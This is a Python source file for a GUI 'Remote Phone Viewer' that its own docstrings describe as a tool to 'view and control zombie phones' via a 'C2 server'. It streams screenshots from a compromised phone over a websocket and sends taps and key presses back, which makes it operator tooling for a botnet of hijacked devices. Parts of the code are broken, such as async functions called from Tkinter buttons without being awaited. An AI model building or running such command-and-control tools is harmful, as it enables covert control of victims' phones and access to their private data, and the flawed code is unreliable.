#!/usr/bin/env python3
"""
Remote Phone Viewer - View and control zombie phones
"""
import asyncio
import websockets
import json
import base64
from io import BytesIO
from PIL import Image
import sys

try:
    import tkinter as tk
    from tkinter import ttk
    HAS_GUI = True
except:
    HAS_GUI = False
    print("Warning: tkinter not available, GUI disabled")


class RemoteViewer:
    def __init__(self, node_id: str, server_url: str = "ws://localhost:8000"):
        self.node_id = node_id
        self.server_url = server_url
        self.websocket = None

        if HAS_GUI:
            self.root = tk.Tk()
            self.root.title(f"Remote Control - {node_id}")
            self.setup_gui()

    def setup_gui(self):
        """Setup GUI for viewing and controlling phone"""

        # Screen display
        self.canvas = tk.Canvas(self.root, width=400, height=800, bg='black')
        self.canvas.pack(side=tk.LEFT)

        # Bind mouse events
        self.canvas.bind('<Button-1>', self.on_click)

        # Control panel
        control_frame = ttk.Frame(self.root)
        control_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=10, pady=10)

        ttk.Label(control_frame, text="Remote Control", font=('Arial', 14, 'bold')).pack(pady=10)

        # Buttons
        ttk.Button(control_frame, text="Refresh Screen", command=self.request_screenshot).pack(fill=tk.X, pady=5)
        ttk.Button(control_frame, text="Back", command=lambda: self.send_key("back")).pack(fill=tk.X, pady=5)
        ttk.Button(control_frame, text="Home", command=lambda: self.send_key("home")).pack(fill=tk.X, pady=5)
        ttk.Button(control_frame, text="Recent Apps", command=lambda: self.send_key("recent")).pack(fill=tk.X, pady=5)

        # Status
        self.status_label = ttk.Label(control_frame, text="Status: Connecting...", foreground="orange")
        self.status_label.pack(pady=20)

    async def connect(self):
        """Connect to C2 server"""
        uri = f"{self.server_url}/api/remote/control/viewer/{self.node_id}"
        try:
            self.websocket = await websockets.connect(uri)
            if HAS_GUI:
                self.status_label.config(text="Status: Connected", foreground="green")
            print(f"Connected to {self.node_id}")

            # Start receiving messages
            asyncio.create_task(self.receive_messages())

        except Exception as e:
            print(f"Connection failed: {e}")
            if HAS_GUI:
                self.status_label.config(text="Status: Connection Failed", foreground="red")

    async def receive_messages(self):
        """Receive messages from phone"""
        try:
            async for message in self.websocket:
                data = json.loads(message)

                if data.get("type") == "screenshot":
                    # Display screenshot
                    self.display_screenshot(data.get("image"))

                elif data.get("type") == "event":
                    print(f"Event: {data}")

        except websockets.exceptions.ConnectionClosed:
            print("Connection closed")
            if HAS_GUI:
                self.status_label.config(text="Status: Disconnected", foreground="red")

    def display_screenshot(self, image_base64: str):
        """Display screenshot on canvas"""
        if not HAS_GUI or not image_base64:
            return

        try:
            # Decode base64 image
            image_data = base64.b64decode(image_base64)
            image = Image.open(BytesIO(image_data))

            # Resize to fit canvas
            image.thumbnail((400, 800), Image.Resampling.LANCZOS)

            # Convert to PhotoImage
            from PIL import ImageTk
            photo = ImageTk.PhotoImage(image)

            # Display on canvas
            self.canvas.delete("all")
            self.canvas.create_image(200, 400, image=photo)
            self.canvas.image = photo  # Keep reference

        except Exception as e:
            print(f"Error displaying screenshot: {e}")

    def on_click(self, event):
        """Handle mouse click on canvas"""
        x = event.x
        y = event.y
        asyncio.create_task(self.send_touch(x, y))

    async def send_touch(self, x: int, y: int):
        """Send touch event to phone"""
        if self.websocket:
            await self.websocket.send(json.dumps({
                "type": "touch",
                "x": x,
                "y": y
            }))

    async def send_key(self, key: str):
        """Send key press to phone"""
        if self.websocket:
            await self.websocket.send(json.dumps({
                "type": "key",
                "key": key
            }))

    async def request_screenshot(self):
        """Request new screenshot from phone"""
        if self.websocket:
            await self.websocket.send(json.dumps({
                "type": "screenshot"
            }))

    def run(self):
        """Run the viewer"""
        if HAS_GUI:
            # Start asyncio loop with Tkinter
            asyncio.create_task(self.connect())
            self.root.mainloop()
        else:
            # CLI only mode
            asyncio.run(self.connect())


async def main():
    if len(sys.argv) < 2:
        print("Usage: python remote_viewer.py <node_id>")
        sys.exit(1)

    node_id = sys.argv[1]
    viewer = RemoteViewer(node_id)
    viewer.run()


if __name__ == "__main__":
    if HAS_GUI:
        viewer = RemoteViewer("test-node-id")
        asyncio.run(viewer.connect())
        viewer.root.mainloop()
    else:
        asyncio.run(main())
